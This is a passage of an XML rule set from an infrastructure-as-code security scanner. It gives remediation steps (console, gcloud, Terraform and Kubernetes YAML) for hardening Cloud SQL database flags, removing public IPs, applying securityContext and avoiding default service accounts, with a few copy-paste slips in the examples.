<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/sql/instances" target="_self">Cloud SQL Instances</a>.</li>
<li>Select the <strong>PostgreSQL instance</strong> where the database flag needs to be enabled.</li>
<li>Click <strong>Edit</strong>.</li>
<li>Scroll down to the <strong>Flags</strong> section.</li>
<li>To set a flag that has not been set on the instance before, click <strong>Add item</strong>.</li>
<li>Select the flag <strong>log_disconnections</strong> from the drop-down menu, and set its value to <strong>On</strong>.</li>
<li>Click <strong>Save</strong>.</li>
<li>Confirm the changes in the <strong>Flags</strong> section on the <strong>Overview</strong> page.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>List all Cloud SQL database Instances using the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud sql instances list</code></li>
<li>Configure the log_disconnections database flag for every Cloud SQL PosgreSQL database instance using the below command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud sql instances patch INSTANCE_NAME --database-flags log_disconnections=on</code></li>
</ol>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>This command will overwrite all previously set database flags. To keep those flags, and add new ones, include the values for all flags to be set on the instance. Any flag not specifically included is set to its default value. For flags that do not take a value, specify the flag name followed by an equals sign (<strong>=</strong>).</p></blockquote>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_sql_database_instance</li>
<li><strong>Arguments</strong>:<br/>
database<em>version = "POSTGRES</em>* "<br/>
settings::database_flags: key:"log_disconnections", value:  by default set to "off"</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_sql_database_instance" "default" {
  name             = "master-instance"
  database_version = "POSTGRES_11"
  region           = "us-central1"

  settings {
+         database_flags {
+            name  = "log_disconnections"
+            value = "on"
          }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_sql_4' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_sql_4</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_sql_4' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_58</key>
    <name>Ensure Cloud SQL SQL server instance database flag cross db ownership chaining is set to Off</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="cloud-sql-sql-server-instance-database-flag-cross-db-ownership-chaining-is-set-to-on"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-sql-sql-server-instance-database-flag-cross-db-ownership-chaining-is-set-to-on"></div>Cloud SQL SQL server instance database flag cross db ownership chaining is set to On</div><a aria-label="Skip link to Cloud SQL SQL server instance database flag cross db ownership chaining is set to On" class="heading-anchor-icon fa fa-anchor" href="#cloud-sql-sql-server-instance-database-flag-cross-db-ownership-chaining-is-set-to-on"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Use the <strong>cross db ownership chaining</strong> database flag to configure cross-database ownership chaining for an instance of Microsoft SQL Server. This server option allows you to control cross-database ownership chaining at database-level, or to allow cross-database ownership chaining for all databases. </p>
<p>We recommend you disable the <strong>cross db ownership chaining</strong> flag for Cloud SQL SQL Server instances, by setting it to <strong>Off</strong>. Enabling <strong>cross db ownership chaining</strong> is only effective when all of the databases hosted by the instance of SQL Server participate in cross-database ownership chaining, and you are aware of the security implications of this setting.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/sql/instances" target="_self">Cloud SQL Instances</a>.</li>
<li>Select the <strong>PostgreSQL instance</strong> where the database flag needs to be enabled.</li>
<li>Click <strong>Edit</strong>.</li>
<li>Scroll down to the <strong>Flags</strong> section.</li>
<li>To set a flag that has not been set on the instance before, click <strong>Add item</strong>.</li>
<li>Select the flag <strong>cross db ownership chaining</strong> from the drop-down menu, and set its value to <strong>Off</strong>.</li>
<li>Click <strong>Save</strong>.</li>
<li>Confirm the changes in the <strong>Flags</strong> section on the <strong>Overview</strong> page.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>List all Cloud SQL database instances using the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud sql instances list</code></li>
<li>Configure the <strong>cross db ownership chaining</strong> database flag for every Cloud SQL SQL Server database instance using the below command:</li>
</ol>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud sql instances patch INSTANCE_NAME 
--database-flags "cross db ownership chaining=off"
</code></pre>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>This command will overwrite all database flags previously set. To keep those flags, and add new ones, include the values for all flags to be set on the instance. Any flag not specifically included is set to its default value. For flags that do not take a value, specify the flag name followed by an equals sign (<strong>=</strong>).</p></blockquote>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terrafrom"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terrafrom"></div>Terrafrom</div><a aria-label="Skip link to Terrafrom" class="heading-anchor-icon fa fa-anchor" href="#terrafrom"></a></h2>
<ul>
<li><strong>Resource</strong>: google_sql_database_instance</li>
<li><strong>Arguments</strong>:<br/>
database<em>version = "SQLSERVER</em>* "<br/>
settings::database_flags: key:"cross db ownership chaining", value:  by default set to "on"</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_sql_database_instance" "default" {
  name             = "master-instance"
  database_version = "SQLSERVER_2017_STANDARD"
  region           = "us-central1"
  
  settings {
+         database_flags {
+            name  = "cross db ownership chaining""
+            value = "off"
          }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_sql_9' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_sql_9</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_sql_9' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_59</key>
    <name>Ensure Cloud SQL SQL server instance contained database authentication database flag is set to Off</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="cloud-sql-sql-server-instance-contained-database-authentication-database-flag-is-set-to-on"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-sql-sql-server-instance-contained-database-authentication-database-flag-is-set-to-on"></div>Cloud SQL SQL server instance contained database authentication database flag is set to On</div><a aria-label="Skip link to Cloud SQL SQL server instance contained database authentication database flag is set to On" class="heading-anchor-icon fa fa-anchor" href="#cloud-sql-sql-server-instance-contained-database-authentication-database-flag-is-set-to-on"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>A contained database includes all database settings and metadata required to define the database. It has no configuration dependencies on the instance of the Database Engine where the database is installed. Users can connect to the database without authenticating a login at the Database Engine level. Isolating the database from the Database Engine makes it possible to easily move the database to another instance of SQL Server. Contained databases have some unique threats that should be understood and mitigated by SQL Server Database Engine administrators. Most of the threats are related to the USER WITH PASSWORD authentication process, which moves the authentication boundary from the Database Engine level to the database level, </p>
<p>We recommend you ensure the <strong>contained database authentication</strong> database flag for SQL Server database instances is disabled. To achieve this, set the value to <strong>Off</strong>.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/sql/instances" target="_self">Cloud SQL Instances</a>.</li>
<li>Select the <strong>PostgreSQL instance</strong> where the database flag needs to be enabled.</li>
<li>Click <strong>Edit</strong>.</li>
<li>Scroll down to the <strong>Flags</strong> section.</li>
<li>To set a flag that has not been set on the instance before, click <strong>Add item</strong>.</li>
<li>Select the flag <strong>contained database authentication</strong> from the drop-down menu, and set its value to <strong>Off</strong>.</li>
<li>Click <strong>Save</strong>.</li>
<li>Confirm the changes in the <strong>Flags</strong> section on the <strong>Overview</strong> page.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>List all Cloud SQL database Instances using the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud sql instances list</code></li>
<li>Configure the <strong>contained database authentication</strong> database flag for every Cloud SQL SQL Server database instance using the below command:</li>
</ol>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud sql instances patch INSTANCE_NAME 
--database-flags "contained database authentication=off"
</code></pre>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>This command will overwrite all database flags previously set. To keep these flags, and add new ones, include the values for all flags to be set on the instance. Any flag not specifically included is set to its default value. For flags that do not take a value, specify the flag name followed by an equals sign (<strong>=</strong>).</p></blockquote>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_sql_database_instance</li>
<li><strong>Arguments</strong>:<br/>
database<em>version = "SQLSERVER</em>* "<br/>
settings::database_flags: key:"contained database authentication", value:  by default set to "on"</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_sql_database_instance" "default" {
  name             = "master-instance"
  database_version = "SQLSERVER_2017_STANDARD"
  region           = "us-central1"
  
  settings {
+         database_flags {
+            name  = "cross db ownership chaining""
+            value = "off"
          }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_sql_10' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_sql_10</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_sql_10' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_60</key>
    <name>Ensure Cloud SQL database instances do not have public IPs</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="cloud-sql-database-instances-have-public-ips"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-sql-database-instances-have-public-i-ps"></div>Cloud SQL database instances have public IPs</div><a aria-label="Skip link to Cloud SQL database instances have public IPs" class="heading-anchor-icon fa fa-anchor" href="#cloud-sql-database-instances-have-public-ips"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>To lower the organization's attack surface, Cloud SQL databases should not have public IPs. Private IPs provide improved network security and lower latency for your application.</p>
<p>We recommend you configure Second Generation SQL instances to use private IPs instead of public IPs.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/sql/instances" target="_self">Cloud SQL Instances</a>.</li>
<li>Click the instance name to open its <strong>Instance details </strong>page.</li>
<li>Select <strong>Connections</strong>.</li>
<li>Clear the <strong>Public IP</strong> checkbox.</li>
<li>To update the instance, click <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>For every instance remove its public IP and assign a private IP instead:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud beta sql instances patch INSTANCE_NAME --network=VPC_NETWOR_NAME --no- assign-ip</code></li>
<li>Confirm the changes using the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud sql instances describe INSTANCE_NAME</code></li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_sql_database_instance</li>
<li><strong>Arguments</strong>:<br/>
database<em>version = "SQLSERVER</em>* "<br/>
settings::ip_configuration: by default set to "true"</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_sql_database_instance" "default" {
  name             = "master-instance"
  database_version = "SQLSERVER_2017_STANDARD"
  region           = "us-central1"
 
  settings {
+         ip_configuration{
+            ipv4_enabled    = "false"
          }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_sql_11' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_sql_11</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_sql_11' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_29</key>
    <name>Ensure securityContext is applied to pods and containers</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="securitycontext-is-not-applied-to-pods-and-containers"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-security-context-is-not-applied-to-pods-and-containers"></div>securityContext is not applied to pods and containers</div><a aria-label="Skip link to securityContext is not applied to pods and containers" class="heading-anchor-icon fa fa-anchor" href="#securitycontext-is-not-applied-to-pods-and-containers"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p><strong>securityContext</strong> defines privilege and access control settings for your pod or container, and holds security configurations that will be applied to a container. Some fields are present in both <strong>securityContext</strong> and <strong>PodSecurityContext</strong>,  when both are set, <strong>securityContext</strong> takes precedence. </p>
<p>Well-defined privilege and access control settings will enhance assurance that your pod is running with the properties it requires to function.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>:  Container / Pod / Deployment / DaemonSet / StatefulSet / ReplicaSet / ReplicationController / Job / CronJob</li>
<li><strong>Argument</strong>: securityContext (Optional)<br/>
A field that defines privilege and access control settings for your Pod or Container.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Container</button><button type="button">Pod</button><button type="button">CronJob</button><button type="button">Other</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="Container">apiVersion: v1
kind: Pod
metadata:
  name: &lt;Pod name&gt;
spec:
  containers:
  - name: &lt;container name&gt;
    image: &lt;image&gt;
+   securityContext:
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="Pod">apiVersion: v1
kind: Pod
metadata:
  name: &lt;name&gt;
spec:
+  securityContext:
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="CronJob">apiVersion: batch/v1beta1
kind: CronJob
metadata:
  name: &lt;name&gt;
spec:
  schedule: &lt;&gt;
  jobTemplate:
    spec:
      template:
        spec:
+          securityContext:
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="Other">apiVersion: &lt;&gt;
kind: &lt;kind&gt;
metadata:
  name: &lt;name&gt;
spec:
  template:
    spec:
+       securityContext:
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_28' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_28</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_28' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_42</key>
    <name>Ensure default service accounts are not actively used</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="default-service-accounts-are-actively-used"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-default-service-accounts-are-actively-used"></div>Default service accounts are actively used</div><a aria-label="Skip link to Default service accounts are actively used" class="heading-anchor-icon fa fa-anchor" href="#default-service-accounts-are-actively-used"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Every Kubernetes installation has a service account called <em>default</em> that is associated with every running pod. Similarly, to enable pods to make calls to the internal API Server endpoint, there is a <strong>ClusterIP</strong> service called <em>Kubernetes</em>. This combination makes it possible for internal processes to call the API endpoint.</p>
<p>We recommend that users create their own user-managed service accounts and grant the appropriate roles to each service account.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<h3 align="" class="heading heading-3 header-scroll"><div class="heading-anchor anchor waypoint" id="option-1"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-option-1"></div>Option 1</div><a aria-label="Skip link to Option 1" class="heading-anchor-icon fa fa-anchor" href="#option-1"></a></h3>
<ul>
<li><strong>Resource</strong>: ServiceAccount</li>
<li><strong>Argument</strong>: If service name is set to default, <strong>automountServiceAccountToken</strong> should be set to false in order to opt out of automounting API credentials for a service account.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">default service</button><button type="button">non-default service</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="default service">apiVersion: v1
kind: ServiceAccount
metadata:
  name: default
+ automountServiceAccountToken: false
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="non-default service">apiVersion: v1
kind: ServiceAccount
metadata:
+ name: &lt;service name&gt;
</code></pre></div></div>
<h3 align="" class="heading heading-3 header-scroll"><div class="heading-anchor anchor waypoint" id="option-2"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-option-2"></div>Option 2</div><a aria-label="Skip link to Option 2" class="heading-anchor-icon fa fa-anchor" href="#option-2"></a></h3>
<ul>
<li><strong>Resource</strong>: RoleBinding / ClusterRoleBinding</li>
<li><strong>Argument</strong>:<br/>
<strong>RoleBinding</strong> grants the permissions defined in a role to a user or set of users within a specific namespace.<br/>
<strong>ClusterRoleBinding</strong> grants that access cluster-wide. To avoid activating  the default service account, it should not be used as a subject in <strong>RoleBinding</strong> or <strong>ClusterRoleBinding</strong> resources. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">RoleBinding</button><button type="button">ClusterRoleBinding</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="RoleBinding">apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: &lt;name&gt;
subjects:
-- kind: ServiceAccount
-  name: default
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="ClusterRoleBinding">apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: &lt;name&gt;
subjects:
-- kind: ServiceAccount
-  name: default
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_38' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_38</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_38' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_88</key>
    <name>Ensure AWS EC2 instances aren't automatically made public with a public IP</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-ec2-instances-arent-automatically-made-public-and-given-public-ip-addresses"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-ec-2-instances-arent-automatically-made-public-and-given-public-ip-addresses"></div>AWS EC2 instances aren't automatically made public and given public IP addresses</div><a aria-label="Skip link to AWS EC2 instances aren't automatically made public and given public IP addresses" class="heading-anchor-icon fa fa-anchor" href="#aws-ec2-instances-arent-automatically-made-public-and-given-public-ip-addresses"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>A public IP address is an IPv4 address that is reachable from the Internet. You can use public addresses for communication between your instances and the Internet. Each instance that receives a public IP address is also given an external DNS hostname.</p>
<p>We recommend you control whether your instance receives a public IP address as required.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
